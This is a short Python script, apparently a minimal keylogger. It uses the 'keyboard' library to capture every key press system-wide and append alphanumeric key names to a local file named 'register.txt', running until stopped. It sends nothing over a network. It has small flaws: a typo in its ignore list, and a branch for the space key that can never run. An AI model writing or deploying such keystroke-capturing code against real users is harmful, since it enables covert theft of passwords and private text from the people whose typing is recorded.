import keyboard

def on_key_press(key):
    keys_to_ignore = ["atl", "tab", "delete", "back", "esc", "enter"]

    with open("register.txt", "a") as file:
        if key.name not in keys_to_ignore and key.name.isalnum():
            if key.name == "space":
                file.write(" ")
            else:
                file.write(key.name)

keyboard.on_press(on_key_press)
keyboard.wait()
